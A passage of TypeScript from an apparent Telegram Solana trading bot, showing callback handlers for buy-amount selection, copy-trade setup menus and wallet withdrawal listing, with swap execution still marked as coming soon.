                  `💰 Balance: ${bal.toFixed(4)} SOL\n\n` +
                  `Please send the contract address (CA) of the token you want to buy:`,
              });
              await ackCallback(cq.id);
            } else if (data === 'buy_confirm') {
              const uid = cq.from?.id;
              const st = uid ? await getUserState(uid) : null;
              if (!st || !st.startsWith('BUY_TKN|')) {
                await ackCallback(cq.id, 'Session expired');
              } else {
                const [, walletAddr, tokenAddr, symbol, ...nameParts] = st.split('|');
                const name = nameParts.join('|');
                const bal = await getSolBalance(walletAddr);
                const insufficient = bal < 0.002;
                const baseText =
                  `💰 <b>Buy ${escapeHtml(symbol)}</b>\n\n` +
                  `📍 Wallet Balance: ${bal.toFixed(4)} SOL\n` +
                  `🏷️ Token: ${escapeHtml(name)} (${escapeHtml(symbol)})\n\n`;
                const tail = insufficient
                  ? `⚠️ Insufficient SOL balance!\n\nYou need at least 0.002 SOL to make a purchase.\n\nAdd SOL to your wallet and try again.`
                  : `Select an amount to buy:`;
                const mark = (amt: number) => (bal >= amt ? '' : '❌ ');
                await tg('sendMessage', {
                  chat_id: chatId!,
                  parse_mode: 'HTML',
                  text: baseText + tail,
                  reply_markup: {
                    inline_keyboard: [
                      [
                        { text: `${mark(0.5)}0.5 SOL`, callback_data: `bamt|0.5` },
                        { text: `${mark(1.0)}1.0 SOL`, callback_data: `bamt|1.0` },
                      ],
                      [
                        { text: `${mark(2.0)}2.0 SOL`, callback_data: `bamt|2.0` },
                        { text: `${mark(5.0)}5.0 SOL`, callback_data: `bamt|5.0` },
                      ],
                      [{ text: `${mark(10.0)}10.0 SOL`, callback_data: `bamt|10.0` }],
                      [{ text: '🔙 Back', callback_data: 'back_main' }],
                    ],
                  },
                });
                await ackCallback(cq.id);
              }
            } else if (data.startsWith('bamt|')) {
              const amt = Number(data.slice(5));
              const uid = cq.from?.id;
              const st = uid ? await getUserState(uid) : null;
              if (!st || !st.startsWith('BUY_TKN|')) {
                await ackCallback(cq.id, 'Session expired');
              } else {
                const [, walletAddr, , symbol] = st.split('|');
                const bal = await getSolBalance(walletAddr);
                if (bal < amt) {
                  await ackCallback(cq.id, `⚠️ Insufficient SOL (have ${bal.toFixed(4)})`);
                  await tg('sendMessage', {
                    chat_id: chatId!,
                    parse_mode: 'HTML',
                    text:
                      `⚠️ <b>Insufficient SOL balance!</b>\n\n` +
                      `You need at least ${amt} SOL to make this purchase.\n` +
                      `Current balance: ${bal.toFixed(4)} SOL\n\n` +
                      `Add SOL to your wallet and try again.`,
                  });
                } else {
                  await ackCallback(cq.id, 'Coming soon');
                  await tg('sendMessage', {
                    chat_id: chatId!,
                    text: `🚧 Swap execution for ${amt} SOL → ${symbol} is coming soon.`,
                  });
                }
              }
            } else if (data === 'copy_trade') {
              await tg('sendMessage', {
                chat_id: chatId!,
                parse_mode: 'HTML',
                text:
                  `📋 <b>Copy Trade</b>\n\n` +
                  `Automatically copy trades from other wallets to your own wallets.\n\n` +
                  `<b>Current Status:</b>\n\n` +
                  `🔴 Not Active\n\n` +
                  `No copy trade configuration found.\n\n` +
                  `When enabled, bot will automatically execute trades matching the source wallet.`,
                reply_markup: {
                  inline_keyboard: [
                    [{ text: '📋 Setup Copy Trade', callback_data: 'ct_setup' }],
                    [{ text: '📊 View Copy Trading', callback_data: 'ct_view' }],
                    [{ text: '🔙 Back', callback_data: 'back_main' }],
                  ],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'ct_setup') {
              if (cq.from?.id) await setUserState(cq.from.id, 'AWAIT_CT_ADDR');
              await tg('sendMessage', {
                chat_id: chatId!,
                text:
                  `🔍 Copy Trade Setup\n\n` +
                  `Please enter the wallet User ID/Address of the wallet you want to copy trades from:\n\n` +
                  `Type /cancel to cancel.`,
              });
              await ackCallback(cq.id);
            } else if (data === 'ct_view') {
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `📊 No copy trade configurations found.`,
                reply_markup: {
                  inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'ct_auto_buy') {
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `🤖 Bot will automatically execute Buy trades from the target wallet.`,
                reply_markup: {
                  inline_keyboard: [[{ text: '✅ Continue', callback_data: 'ct_auto_buy_go' }]],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'ct_auto_buy_go') {
              if (cq.from?.id) await clearUserState(cq.from.id);
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `Auto BUY activated ✅`,
                reply_markup: {
                  inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'ct_notif_buy') {
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `🔔 You will have to approve all buy/sell trades before they execute.`,
                reply_markup: {
                  inline_keyboard: [[{ text: '✅ Continue', callback_data: 'ct_notif_buy_go' }]],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'ct_notif_buy_go') {
              if (cq.from?.id) await clearUserState(cq.from.id);
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `Notification buy activated ✅`,
                reply_markup: {
                  inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'withdraw_sol') {
              const uid = cq.from?.id;
              const wallets = uid ? await getUserWallets(uid) : [];
              if (!wallets.length) {
                await tg('sendMessage', {
                  chat_id: chatId!,
                  text: `❌ No connected wallets found.`,
                  reply_markup: {
                    inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]],
                  },
                });
              } else {
                const balances = await Promise.all(wallets.map((w) => getSolBalance(w.address)));
                const buttons = wallets.map((w, i) => [{
                  text: `Wallet ${i + 1}  ${shortAddr(w.address)}  (${balances[i].toFixed(4)} SOL)`,
                  callback_data: `wd|${w.address}`,
                }]);
                buttons.push([{ text: '🔙 Back', callback_data: 'back_main' }]);
                await tg('sendMessage', {
                  chat_id: chatId!,
                  text: `💰 Withdraw SOL\n\nSelect wallet to withdraw from:`,
                  reply_markup: { inline_keyboard: buttons },
                });
              }
              await ackCallback(cq.id);
            } else {
              await ackCallback(cq.id);
            }
          }
        } catch (e) {
          console.error('Webhook handler error:', e);
          return Response.json({ ok: false }, { status: 500 });
        }

        return Response.json({ ok: true });
      },
    },
  },
});
